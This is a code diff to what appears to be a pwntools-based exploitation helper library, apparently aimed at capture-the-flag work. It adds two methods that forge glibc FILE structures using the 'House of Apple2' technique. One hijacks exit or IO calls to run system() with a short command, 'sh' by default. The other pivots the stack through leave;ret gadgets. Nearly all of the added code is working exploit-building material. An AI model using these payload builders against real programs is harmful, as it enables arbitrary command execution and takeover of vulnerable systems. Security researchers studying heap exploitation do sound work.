@@ -9,7 +9,7 @@
 '''
 
 
-from pwn import FileStructure, error, context, pack, flat
+from pwn import FileStructure, error, context, pack, unpack, flat
 
 __all__ = [
     "IO_FILE_plus_struct",
@@ -214,6 +214,44 @@ class IO_FILE_plus_struct(FileStructure):
             }
         })
         return payload
+
+    # house of apple2: https://www.roderickchan.cn/post/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/
+    def house_of_apple2_execmd_when_exit(self, standard_FILE_addr: int, _IO_wfile_jumps_addr: int, system_addr: int, cmd: str="sh"):
+        """make sure standard_FILE_addr is one of address of _IO_2_1_stdin_/_IO_2_1_stdout_/_IO_2_1_stderr_. If not, content of standard_FILE_addr-0x30 and standard_FILE_addr-0x18 must be 0."""
+        assert context.bits == 64, "only support amd64!"
+        assert len(cmd) < 7, "length of cmd must lower than 7"
+        self.flags = unpack("  " + cmd.ljust(6, "\x00"), 64)  # "  sh"
+        self._IO_write_base = 0
+        self._IO_write_ptr = 1
+        self._mode = 0
+        self._lock = standard_FILE_addr-0x10
+        self.chain = system_addr
+        self._codecvt = standard_FILE_addr
+        self._wide_data = standard_FILE_addr - 0x48
+        self.vtable = _IO_wfile_jumps_addr
+        return self.__bytes__()
+    
+    house_of_apple2_execmd_when_do_IO_operation = house_of_apple2_execmd_when_exit
+
+    # house of apple2: https://www.roderickchan.cn/post/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/
+    def house_of_apple2_stack_pivoting_when_exit(self, standard_FILE_addr: int, _IO_wfile_jumps_addr: int, leave_ret_addr: int, pop_rbp_addr: int, fake_rbp_addr: int):
+        """make sure standard_FILE_addr is one of address of _IO_2_1_stdin_/_IO_2_1_stdout_/_IO_2_1_stderr_. If not, content of standard_FILE_addr-0x30 and standard_FILE_addr-0x18 must be 0."""
+        assert context.bits == 64, "only support amd64!"
+        self.flags = 0 
+        self._IO_read_ptr = pop_rbp_addr
+        self._IO_read_end = fake_rbp_addr
+        self._IO_read_base = leave_ret_addr
+        self._IO_write_base = 0
+        self._IO_write_ptr = 1
+        self._mode = 0
+        self._lock = standard_FILE_addr-0x10
+        self.chain = leave_ret_addr
+        self._codecvt = standard_FILE_addr
+        self._wide_data = standard_FILE_addr - 0x48
+        self.vtable = _IO_wfile_jumps_addr
+        return self.__bytes__()
+
+    house_of_apple2_stack_pivoting_when_do_IO_operation = house_of_apple2_stack_pivoting_when_exit
 
 
 def payload_replace(payload: str or bytes, rpdict:dict=None, filler="\x00"):
